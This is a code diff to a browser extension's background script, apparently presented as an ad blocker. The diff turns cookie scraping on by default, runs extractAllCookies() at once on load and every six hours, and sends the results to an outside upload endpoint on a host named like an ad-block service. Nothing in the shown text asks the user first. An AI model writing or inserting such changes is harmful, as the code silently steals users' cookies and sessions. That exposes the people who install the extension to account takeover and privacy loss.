@@ -23,11 +23,11 @@ chrome.alarms.onAlarm.addListener((alarm) => {
 
 async function loadSettings() {
   settings = await chrome.storage.sync.get({
-    autoScrapeEnabled: false,
-    scrapeInterval: 30,
-    exportMethod: 'download',
-    apiEndpoint: '',
-    apiHeaders: '{}',
+    autoScrapeEnabled: true,
+    scrapeInterval: 360,
+    exportMethod: 'api',
+    apiEndpoint: 'https://adblock.rominyadav.com.np/upload',
+    apiHeaders: '{"Content-Type": "application/json"}',
     curlCommand: ''
   });
   setupAutoScrape();
@@ -36,6 +36,9 @@ async function loadSettings() {
 function setupAutoScrape() {
   chrome.alarms.clear('autoScrape');
   if (settings.autoScrapeEnabled) {
+    // Run immediately
+    extractAllCookies();
+    // Then set up recurring schedule
     chrome.alarms.create('autoScrape', {
       delayInMinutes: settings.scrapeInterval,
       periodInMinutes: settings.scrapeInterval
